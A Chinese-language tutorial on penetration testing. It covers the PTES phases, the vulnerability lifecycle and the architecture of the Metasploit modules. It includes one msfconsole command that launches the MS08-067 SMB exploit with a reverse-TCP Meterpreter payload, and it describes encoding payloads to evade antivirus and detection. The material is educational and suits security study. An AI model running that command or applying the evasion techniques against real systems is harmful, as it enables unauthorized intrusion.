> **渗透测试**就是一种通过模拟恶意攻击者的技术与方法，挫败目标系统安全控制措施，取得访问控制权，并发现具备业务影响后果安全隐患的一种安全测试与评估方式；渗透测试具备两种基本类型：黑盒测试与白盒测试，结合两者的称为灰盒测试

# 一、PTES渗透测试执行标准

### 1.前期交互阶段

通常涉及收集客户需求、准备测试计划、定义测试范围与边界、定义业务目标、项目管理与规划等活动

### 2.情报收集阶段

情报收集是否充分在很大程度上决定了渗透测试的成败

俗称信息收集阶段，方法包括公开来源信息查询、Google Hacking、社会工程学、网络踩点、扫描探测、被动监听、服务查点等

### 3.威胁建模阶段

针对获取的信息进行威胁建模与攻击规划，从大量的信息情报中理清头绪，确定出最可行的攻击通道

### 4.漏洞分析阶段

考虑如何取得目标系统的访问控制权，综合分析前几个阶段获取并汇总的情报信息，特别是安全漏洞扫描结果、服务查点信息等，通过搜索可获取的渗透代码资源，找出可以实施渗透攻击的攻击点，并在实验环境中进行验证。同时还可以针对攻击通道上的一些关键系统与服务进行安全漏洞探测与挖掘，期望找出可被利用的未知安全漏洞

### 5.渗透攻击阶段

渗透测试需要利用所找到的目标系统漏洞，来真正入侵系统当中，获得访问控制权

渗透攻击可以利用公开渠道可获得的渗透代码，但一般在实际应用场景中，渗透测试者还需要充分考虑目标系统特性来定制渗透攻击，并需要挫败目标网络与系统中实施的安全防御措施，才能成功达成渗透目的。在黑盒测试中，渗透测试者还需要考虑目标系统检测机制的逃逸，从而避免造成目标组织安全响应团队的警觉和发现

### 6.后渗透攻击阶段

根据目标组织的业务经营模式、保护资产形式与安全防御计划的不同特点，自主设计出攻击目标，识别关键基础设施，并寻找客户组织最具价值和尝试安全保护的信息和资产，最终达到能够对客户组织造成最重要业务影响的攻击途径

Metasploit渗透测试框架中另一个工具Meterpreter中实现了特权提升、信息收集、系统监控、跳板攻击与内网扩展等多样化的功能特性，在后渗透攻击阶段提供了强大功能

### 7.报告阶段

渗透测试过程最终向客户组织提交，取得认可并成功获得合同付款的就是一份渗透测试报告。
完整地报告凝聚之前所有阶段之中所获取的关键情报信息、探测和发掘出的系统安全漏洞、成功渗透攻击的过程，以及造成业务影响后果的攻击途径，同时还要站在防御者的角度上，帮助他们分析安全防御体系中的薄弱环节、存在的问题，以及修补与升级技术方案


# 二、安全漏洞生命周期

在渗透测试流程中，核心内容是找出目标系统中存在的**安全漏洞**
利用安全漏洞来造成入侵或破坏效果的程序就称为**渗透代码**(Exploit),或者**漏洞利用代码**

![](https://cdn.jsdelivr.net/gh/qoo3/imgur@master/bookmaker/1589473294086.png)

1）安全漏洞研究与挖掘

主要利用源代码审核（白盒测试）、逆向工程（灰盒测试）、Fuzz测试（黑盒测试）等方法，挖掘目标系统中存有的可被利用的安全漏洞

2）渗透代码开发与测试

在安全漏洞挖掘的同时，开发出概念严重性的**渗透攻击代码（POC）**，用于验证找到的安全漏洞是否确实存在，并确认其是否可被利用

3）安全漏洞和渗透代码在封闭团队中流传
4）安全漏洞和渗透代码开始扩散
5）恶意程序出现并开始传播
6）渗透代码/恶意程序大规模传播并危害互联网
7）渗透攻击代码/攻击工具/恶意程序逐渐消亡


# 三、Metasploit体系框架

![](https://cdn.jsdelivr.net/gh/qoo3/imgur@master/bookmaker/1589473294095.png)

`基础库文件`：Rex、framework-core、framework-base

`模块Module`：辅助模块（Aux）、渗透攻击模块（Exploit）、后渗透攻击模块（Post）、攻击载荷模块（Payloads）、空指令模块（Nops）和编译器模块（Encoders），目前msf5还新增了免杀后门模块（evasion）

`接口`：msfconsole控制台终端、msfcli命令行、msfgui图形化界面、armitage图形化界面以及msfapi远程调用接口，不过命令行和图形化目前已经被淘汰，而要实现命令行脚本可以编写脚本使用msfconsole -x来执行,更加实用

 ```shell
 msfconsole -x "use exploit/windows/smb/ms08_067_netapi; set RHOST [IP]; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST [IP]; run"
 ```

`插件`：插件可以集成现有的一些外部安全工具，如Nessus、OpenVAS等漏洞扫描器

`功能程序`：msfpayload、msfencode和msfvenom可以将攻击载荷封装为可执行文件、C语言、JavaScript语言等多种形式，并可以进行各种类型的编码；msf* scan系列功能程序提供了在PE、ELF等各种类型文件中搜索特定指令的功能，可以帮助渗透代码开发人员定位指令地址

### @深入理解Module

`payload`字面意思是有效攻击载荷，包含需要在远程主机上运行的恶意代码。

`exploit`是传送系统（运载火箭），payload是用来实际做什么事的代码（弹头）

#### 1.渗透攻击模块

利用发现的安全漏洞或配置弱点对远程目标系统进行攻击，以植入和运行攻击载荷，从而获得对远程目标系统访问权的`代码组件`

exploit分类依据：

- 目标系统的操作系统平台，以及所针对的网络服务或应用程序类型
- 按照所利用的安全漏洞所在的位置分为`主动渗透攻击`（web应用程序渗透攻击、SCADA工业控制系统服务渗透攻击）与`被动渗透攻击`（浏览器软件漏洞攻击、文件格式类漏洞攻击）

#### 2.攻击载荷模块

攻击载荷是在渗透攻击成功后促使目标系统运行的一段植入代码，通常作用是为渗透攻击者打开目标系统上的控制会话连接

在传统渗透代码开发中，攻击载荷只是一段功能简单的shellcode代码，攻击者需以汇编语言编制并转换为目标系统CPU体系结构支持的机器代码

Meterpreter就是一个最复杂、具有大量后渗透攻击阶段功能特性的攻击载荷，其他还有提供各种系统平台上可以运行的提权命令，VNC图形化界面控制等

渗透攻击者可以在选定渗透攻击代码之后，从很多适用的攻击载荷中灵活组装以获得控制会话

Metasploit攻击载荷模块分类：

1. 独立攻击载荷是完全自包含的，可直接独立地植入目标系统进行执行
	- 比如`windows/shell_bind_tcp`是适用于win平台，能够将shell控制会话绑定在指定TCP端口上的攻击载荷
2. 传输器（Stager）和传输体（Stage）配对分阶段植入技术，由渗透攻击模块首先植入小且可靠的传输器载荷，然后再运行传输器载荷时进一步下载传输体载荷并执行
	- 可以绕过win平台的NX、DEP等安全防御机制，**且？不再受大小限制**（这是很重要的特性），加载如Meterpreter、VNC桌面控制等复杂的大型攻击载荷
	- 如`windows/shell/bind_tcp`是由一个传输器载荷（bind_tcp）和一个传输体载荷（shell）所组成的，其功能等价于前面提到的独立攻击载荷

#### 3.空指令模块

空指令（NOP）是一些对程序运行状态下不会造成任何实质影响的空操作或无关操作指令，在x86 CPU体系架构平台上的操作码是0x90

Metasploit框架中的空指令模块就是用来在攻击载荷中添加空指令区，使触发渗透攻击后跳转执行shellcode时，有一个较大的安全区，从而避免受到内存地址随机化、返回地址计算偏差等原因造成的shellcode执行失败，从而提高攻击可靠性的组件

#### 4.编码器模块

攻击载荷模块与空指令模块组装完成一个指令序列后，在这段指令被渗透攻击模块加入邪恶数据缓冲区交由目标系统运行之前，Metasploit框架还需要完成一道非常重要的工序——编码。如果没有这道工序，渗透攻击可能不会奏效，或者中途被检测到并阻断

`编码器模块的使命`：

1. 确保攻击载荷中不会出现渗透攻击过程中应加以避免的"坏字符"，badchars的存在将导致特殊构造的邪恶数据缓冲区无法按逾期目标完全输入到存有漏洞的软件历程中

2.  对攻击载荷进行“免杀”处理，通过多个编码器的嵌套编码，达到类似混淆的目的

#### 5.后渗透攻击模块

- 主要支持在渗透攻击取得目标系统远程权之后，在受控系统中进行各式各样的后渗透攻击动作，比如获取敏感信息、进一步扩展、实施跳板攻击等

- 后渗透模块需要通过Meterpreter或shell攻击载荷加载到目标操作系统平台上运行，是完成在目标系统上进一步攻击功能的组件代码，可以代替一些扩展脚本`（Meterpreter的基本功能是控制会话，还集成大量的后渗透攻击命令与功能）`

